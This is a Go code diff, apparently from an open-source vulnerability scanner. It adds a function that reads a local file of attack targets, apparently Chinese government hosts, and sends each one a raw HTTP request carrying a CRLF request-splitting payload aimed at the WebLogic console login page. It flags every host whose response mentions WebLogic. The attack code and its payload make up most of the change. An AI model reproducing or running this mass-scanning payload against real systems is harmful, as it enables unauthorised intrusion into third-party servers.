@@ -1,11 +1,11 @@
-package main
+package generate
 
 import (
 	"fmt"
-	"github.com/hktalent/ProScan4all/lib/Smuggling"
 	"github.com/hktalent/ProScan4all/lib/socket"
-	"github.com/hktalent/ProScan4all/lib/util"
+	util "github.com/hktalent/go-utils"
 	"net/url"
+	"os"
 	"strings"
 )
 
@@ -72,12 +72,31 @@ func (r *CLTE) DoFirst(szPath, szLocalHost string) {
 	}
 }
 
-func main() {
-	a := strings.Split(``, "\n")
-	for _, x := range a {
-		Smuggling.DoCheckSmuggling(x, "")
-		//x1 := NewCLTE(x)
-		//x1.DoFirst("/svn/", "")
+/*
+/console/login/LoginForm.jsp
+*/
+func Xain() {
+	if data, err := os.ReadFile("/Users/51pwn/MyWork/scan4all/atckData/gov.cn_64876.txt"); nil == err {
+		a := strings.Split(string(data), "\n")
+		for _, x := range a {
+			func(s1 string) {
+				util.DefaultPool.Submit(func() {
+					x1 := socket.NewCheckTarget(s1, "tcp", 3)
+					defer x1.Close()
+					defer fmt.Printf("%s is over\r", s1)
+					if r1 := x1.SendOnePayload(`GET /%%20HTTP/1.1%%0d%%0aHost:%%20localhost%%0d%%0a%%0d%%0aGET%%20%s HTTP/1.1
+Host: %s%s
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+connection: close
+
+`, "/console/login/LoginForm.jsp", x1.HostName, 3); -1 < strings.Index(r1, "eblogic") {
+						fmt.Printf("%s\n%s", s1, r1)
+					}
+				})
+			}(x)
+
+			//x1 := NewCLTE(x)
+			//x1.DoFirst("/svn/", "")
+		}
 	}
-	util.Wg.Wait()
 }
